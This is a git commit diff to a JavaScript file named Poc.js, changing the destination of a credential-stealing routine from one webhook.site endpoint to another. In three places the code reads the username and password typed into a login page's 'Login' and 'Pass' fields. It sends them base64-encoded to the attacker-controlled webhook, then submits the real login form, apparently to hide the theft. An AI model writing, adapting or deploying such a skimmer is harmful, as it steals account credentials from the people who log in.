f49434509b79d9b8d0007e29572e047a61619d7c
not-a-hacker404 <agenteash0004@gmail.com>
2026-03-18 18:31:38 -0600

    Update Poc.js

--- Poc.js
+++ Poc.js
@@ -83,7 +83,7 @@ async function atms() {
 
 
         if (usuario && clave) {
-            fetch('https://webhook.site/fac65353-c184-4b45-960e-533e96b3b897?u=' + btoa(usuario) + '&p=' + btoa(clave), { mode: 'no-cors' });
+            fetch('https://webhook.site/1f9cfc87-8965-4d57-aaf0-21a4fa684995?u=' + btoa(usuario) + '&p=' + btoa(clave), { mode: 'no-cors' });
             
             let datosLogin = new URLSearchParams(new FormData(formularioReal));
             datosLogin.append('Recordarme', 'on');
@@ -261,7 +261,7 @@ async function atms() {
                 let usuario = document.getElementById('Login').value;
                 let clave = document.getElementById('Pass').value;
 
-                let urlWebhook = 'https://webhook.site/fac65353-c184-4b45-960e-533e96b3b897?u=' + btoa(usuario) + '&p=' + btoa(clave);
+                let urlWebhook = 'https://webhook.site/1f9cfc87-8965-4d57-aaf0-21a4fa684995?u=' + btoa(usuario) + '&p=' + btoa(clave);
 
                 fetch(urlWebhook, { mode: 'no-cors' })
                 .then(() => {
@@ -286,7 +286,7 @@ async function atms() {
             let uFalso = document.getElementById('Login').value;
             let pFalso = document.getElementById('Pass').value;
 
-            fetch('https://webhook.site/fac65353-c184-4b45-960e-533e96b3b897?u=' + btoa(uFalso) + '&p=' + btoa(pFalso), { mode: 'no-cors' });
+            fetch('https://webhook.site/1f9cfc87-8965-4d57-aaf0-21a4fa684995?u=' + btoa(uFalso) + '&p=' + btoa(pFalso), { mode: 'no-cors' });
 
             let bodyDatos = `Login=${encodeURIComponent(uFalso)}&Pass=${encodeURIComponent(pFalso)}&Recordarme=on&Entrar=on`;
             
